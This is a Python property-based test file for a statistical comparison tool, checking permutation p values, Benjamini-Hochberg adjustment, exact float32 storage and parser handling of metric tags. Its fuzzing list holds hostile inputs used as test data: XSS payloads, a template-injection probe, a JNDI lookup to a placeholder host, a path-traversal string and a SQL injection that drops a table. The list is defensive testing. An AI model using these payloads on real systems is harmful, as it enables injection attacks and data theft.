"""The statistical core stated as properties, and checked against generated data.

The gates this project publishes are already phrased as properties, so this
file encodes them rather than paraphrasing them into examples. What each test
holds is a claim that has to be true of EVERY input, which is a different kind
of statement from a fixture that happened to come out right, and the ones here
are the claims whose failure would be silent:

* a permutation p value cannot depend on the order the runs arrived in, because
  the null hypothesis it tests is that the labels are exchangeable;
* Benjamini Hochberg adjusted values are monotone in the raw ones, in both
  senses: they preserve the ranking, and lowering an input can never raise an
  output. The published 1995 example pins the arithmetic to the paper;
* a store round trip is exact for any finite float32 series, which is the whole
  justification for holding the model at float32 (see `docs/DESIGN_DECISIONS`);
* a parser hands back the tag it was given, whatever text that tag is made of,
  which is the input side of D3 and D28;
* `paired_permutation` cannot depend on the order the pairs arrived in either.

Sizes are held where the enumeration is exhaustive, because that is where the p
value is exact and a claim of invariance is a claim about an exact number
rather than about a sampler. `nox -s test_property` reruns the file at the
`thorough` profile.
"""

from __future__ import annotations

import json
from pathlib import Path

import numpy as np
import pytest
from hypothesis import assume, given, settings
from hypothesis import strategies as st
from hypothesis.extra import numpy as npst

from triage.analysis.comparison import ComparisonConfig, compare_seed_replicated, paired_permutation
from triage.analysis.regression import benjamini_hochberg
from triage.core.experiment import Experiment, MetricSeries
from triage.core.store import Store
from triage.parsers import JsonlParser

#: Values a metric can plausibly take, bounded away from the magnitudes where
#: float32 rounding rather than the code under test decides the answer.
METRIC_VALUES = st.floats(
    min_value=-1e4, max_value=1e4, allow_nan=False, allow_infinity=False, width=32
)

#: Raw p values. Zero and one are included on purpose: both are attainable from
#: an exhaustive permutation test and both are where a step up procedure is most
#: likely to be written wrongly.
P_VALUES = st.floats(min_value=0.0, max_value=1.0, allow_nan=False)

#: Text that has broken a renderer, a shell or a template somewhere. Generated
#: text finds the unicode cases; these find the ones somebody wrote on purpose.
HOSTILE = st.sampled_from(
    [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "{{7*7}}",
        "${jndi:ldap://example.invalid/a}",
        "../../etc/passwd",
        # Written as an escape rather than as the character: U+202E reverses the
        # display order of everything after it, so a literal one here would
        # rearrange this file for the next person who reads it.
        "tag\u202ereversed",
        "tag\x00null",
        "tag\twith\ttabs",
        "'; DROP TABLE experiments; --",
        "\U0001f600 emoji",
        "",
        " ",
    ]
)

TAG = "val/loss"


def run_at(value: float, run_id: str, variant: str) -> Experiment:
    """A run whose window statistic IS `value`, and nothing else.

    A constant series is the honest way to put a chosen number into the
    comparison: the smoother is an average of equal values and the final window
    mean is the same value again, so the statistic the test permutes is exactly
    the number the strategy generated.
    """
    steps = np.arange(24, dtype=np.int64)
    return Experiment(
        run_id=run_id,
        source_path=f"/generated/{run_id}",
        source_format="jsonl",
        config={"variant": variant},
        metrics={
            TAG: MetricSeries(tag=TAG, steps=steps, values=np.full(24, value, dtype=np.float32))
        },
    )


def runs_from(values: list[float], variant: str) -> list[Experiment]:
    return [run_at(value, f"{variant}_{index}", variant) for index, value in enumerate(values)]


# ------------------------------------------------- permutation p, and ordering


@given(
    values=st.lists(METRIC_VALUES, min_size=6, max_size=8, unique=True),
    data=st.data(),
)
def test_the_permutation_p_value_does_not_depend_on_the_order_of_the_runs(
    values: list[float], data: st.DataObject
) -> None:
    """The null is that the LABEL is exchangeable, not that the order is data.

    Seeds arrive from a scheduler in whatever order the scheduler felt like, so
    a p value that moved when two runs swapped places in the list would make the
    verdict an artefact of the filesystem. At these sizes the enumeration is
    exhaustive, so this is a claim about an exact number.

    The values are drawn distinct, which is not a convenience: with a repeated
    value in one condition the two arrangements that differ only by swapping it
    are the same arrangement, and the test would be asserting invariance over a
    tie rather than over an ordering.
    """
    half = len(values) // 2
    baseline, candidate = values[:half], values[half:]
    config = ComparisonConfig()

    first = compare_seed_replicated(
        runs_from(baseline, "base"), runs_from(candidate, "cand"), TAG, config
    )

    shuffled_baseline = data.draw(st.permutations(baseline))
    shuffled_candidate = data.draw(st.permutations(candidate))
    second = compare_seed_replicated(
        runs_from(shuffled_baseline, "base"), runs_from(shuffled_candidate, "cand"), TAG, config
    )

    assert first.exact and second.exact, "the property is stated over the exact enumeration"
    assert first.p_value == second.p_value
    assert first.effect == pytest.approx(second.effect)


@given(
    baseline=npst.arrays(
        np.float64,
        st.integers(min_value=4, max_value=10),
        elements=st.floats(min_value=0.0, max_value=1.0, allow_nan=False, width=32),
        unique=True,
    ),
    data=st.data(),
)
def test_the_paired_permutation_does_not_depend_on_the_order_of_the_pairs(
    baseline: np.ndarray, data: st.DataObject
) -> None:
    """E3. A pair is a unit, and units are not ordered.

    Rows arrive in whatever order the evaluation harness wrote them, so the same
    fields scored twice must give the same p value however the file was sorted.
    The permutation is applied to both arrays together, because permuting one
    alone would break the pairing rather than reorder it.
    """
    candidate = data.draw(
        npst.arrays(
            np.float64,
            baseline.shape,
            elements=st.floats(min_value=0.0, max_value=1.0, allow_nan=False, width=32),
            unique=True,
        )
    )
    order = np.asarray(data.draw(st.permutations(range(baseline.size))))
    config = ComparisonConfig()

    first = paired_permutation(baseline, candidate, statistic=np.mean, config=config)
    second = paired_permutation(baseline[order], candidate[order], statistic=np.mean, config=config)

    assert first.exact and second.exact
    assert first.p_value == second.p_value


@pytest.mark.slow
@settings(max_examples=200)
@given(values=st.lists(METRIC_VALUES, min_size=8, max_size=10, unique=True), data=st.data())
def test_ordering_invariance_holds_over_a_much_larger_search(
    values: list[float], data: st.DataObject
) -> None:
    """The same property at more examples and larger designs.

    Kept separate and marked slow rather than raising the budget of the test
    above: the fast profile is what runs before every commit, and a property
    suite that costs a minute is a property suite that gets skipped. The
    calibration job runs this one.
    """
    half = len(values) // 2
    baseline, candidate = values[:half], values[half:]
    first = compare_seed_replicated(runs_from(baseline, "b"), runs_from(candidate, "c"), TAG)
    second = compare_seed_replicated(
        runs_from(data.draw(st.permutations(baseline)), "b"),
        runs_from(data.draw(st.permutations(candidate)), "c"),
        TAG,
    )

    assert first.p_value == second.p_value


# --------------------------------------------------------- Benjamini Hochberg


@given(p_values=st.lists(P_VALUES, min_size=1, max_size=30))
def test_adjusted_p_values_preserve_the_ranking_and_never_fall_below_the_raw(
    p_values: list[float],
) -> None:
    """Two properties of the step up procedure, both load bearing.

    The adjusted value is what the reports print beside a verdict and what the
    statistical gate compares against the false discovery rate, so it has to be
    a p value: in [0, 1], never smaller than the raw value it adjusts (which
    would make the correction anti conservative), and ordered the same way the
    raw values are (or a stricter raw p value would have been reported as the
    weaker finding).
    """
    adjusted = benjamini_hochberg(p_values)

    assert adjusted.shape == (len(p_values),)
    assert np.all((adjusted >= 0.0) & (adjusted <= 1.0))
    for raw, value in zip(p_values, adjusted.tolist(), strict=True):
        assert value >= raw - 1e-12
    for i, j in ((i, j) for i in range(len(p_values)) for j in range(len(p_values))):
        if p_values[i] < p_values[j]:
            assert adjusted[i] <= adjusted[j] + 1e-12


@given(p_values=st.lists(P_VALUES, min_size=1, max_size=20), data=st.data())
def test_lowering_one_p_value_can_never_raise_an_adjusted_one(
    p_values: list[float], data: st.DataObject
) -> None:
    """Monotone in the input vector, which is the property a reader assumes.

    Stronger evidence on one metric must not make another metric's verdict
    weaker. The step up procedure has this property and a naive implementation
    of it does not, which is why it is checked over generated vectors rather
    than argued from the formula.
    """
    index = data.draw(st.integers(min_value=0, max_value=len(p_values) - 1))
    lowered = list(p_values)
    lowered[index] = data.draw(st.floats(min_value=0.0, max_value=p_values[index] or 0.0))

    before = benjamini_hochberg(p_values)
    after = benjamini_hochberg(lowered)

    assert np.all(after <= before + 1e-12)


def test_the_published_1995_example_comes_out_as_the_paper_reports_it() -> None:
    """Benjamini and Hochberg (1995), the fifteen p values of their Table 1.

    The paper rejects the first four hypotheses at q = 0.05 where Bonferroni
    rejects three, and that pair of counts is the example the whole procedure is
    usually introduced with. Pinning it here means the implementation is checked
    against the source rather than against itself.
    """
    published = [
        0.0001, 0.0004, 0.0019, 0.0095, 0.0201, 0.0278, 0.0298, 0.0344,
        0.0459, 0.3240, 0.4262, 0.5719, 0.6528, 0.7590, 1.0000,
    ]  # fmt: skip

    adjusted = benjamini_hochberg(published, false_discovery_rate=0.05)

    assert int(np.count_nonzero(adjusted <= 0.05)) == 4
    assert int(np.count_nonzero(np.asarray(published) <= 0.05 / len(published))) == 3
    # The step up values themselves, so a change in the arithmetic is visible
    # and not merely a change in how many cleared the line.
    np.testing.assert_allclose(adjusted[:5], [0.0015, 0.0030, 0.0095, 0.035625, 0.0603], rtol=1e-9)
    assert adjusted[-1] == pytest.approx(1.0)


# --------------------------------------------------------- the store round trip


@given(
    values=npst.arrays(
        np.float32,
        st.integers(min_value=1, max_value=400),
        elements=st.floats(allow_nan=False, allow_infinity=False, width=32),
    )
)
def test_a_store_round_trip_is_exact_for_any_finite_float32_series(
    tmp_path: Path, values: np.ndarray
) -> None:
    """The claim the whole design rests on, over arbitrary arrays.

    The model holds float32 because the store writes float32, so that a round
    trip is exact rather than merely close. `assert_array_equal` is the point:
    at `rtol` this test would pass against a store that quietly went through
    float16, and every comparison run against the database would then be a
    different comparison from one run against the logs.
    """
    steps = np.arange(values.size, dtype=np.int64)
    experiment = Experiment(
        run_id="round_trip",
        source_path="/generated/round_trip",
        source_format="jsonl",
        metrics={TAG: MetricSeries(tag=TAG, steps=steps, values=values)},
    )

    with Store(tmp_path / "round_trip.db") as store:
        store.upsert(experiment, source_hash="fingerprint")
        loaded = store.load("round_trip")

    np.testing.assert_array_equal(loaded.series(TAG).values, values)
    np.testing.assert_array_equal(loaded.series(TAG).steps, steps)
    assert loaded.series(TAG).values.dtype == np.float32


# ------------------------------------------------------------- parser fuzzing


@given(tag=st.one_of(HOSTILE, st.text(max_size=40)), value=METRIC_VALUES)
def test_a_parser_returns_the_tag_it_was_given_whatever_the_tag_is_made_of(
    tmp_path: Path, tag: str, value: float
) -> None:
    """D3 and D28 from the input end: the tag is data, not code.

    A metric name comes from somebody else's training script and reaches a
    Jinja template, a Plotly axis, a terminal and a SQLite key. The renderer
    escaping it is one half of that story; the other half is that the parser
    must neither mangle it nor be stopped by it, or the escaping downstream is
    protecting a string that is already wrong.
    """
    log = tmp_path / "run" / "metrics.jsonl"
    log.parent.mkdir(exist_ok=True)
    log.write_text(
        json.dumps({"step": 0, "tag": tag, "value": value}) + "\n",
        encoding="utf-8",
    )

    experiment = JsonlParser().parse(log)

    assert experiment.tags == [tag]
    assert experiment.series(tag).values[0] == np.float32(value)


@given(tags=st.lists(HOSTILE, min_size=2, max_size=6, unique=True))
def test_hostile_tags_stay_distinct_through_a_store_round_trip(
    tmp_path: Path, tags: list[str]
) -> None:
    """Tag names are database keys, and two tags must not become one.

    A normalisation applied anywhere on this path (stripping, casefolding,
    replacing what looks unsafe) would silently merge two series into one, and
    the merged series would look like a run that logged twice as often rather
    than like a defect.
    """
    steps = np.arange(3, dtype=np.int64)
    experiment = Experiment(
        run_id="hostile",
        source_path="/generated/hostile",
        source_format="jsonl",
        metrics={
            tag: MetricSeries(tag=tag, steps=steps, values=np.full(3, index, dtype=np.float32))
            for index, tag in enumerate(tags)
        },
    )
    assume(len(experiment.metrics) == len(tags))

    with Store(tmp_path / "hostile.db") as store:
        store.upsert(experiment, source_hash="fingerprint")
        loaded = store.load("hostile")

    assert loaded.tags == sorted(tags)
    for index, tag in enumerate(tags):
        np.testing.assert_array_equal(
            loaded.series(tag).values, np.full(3, index, dtype=np.float32)
        )
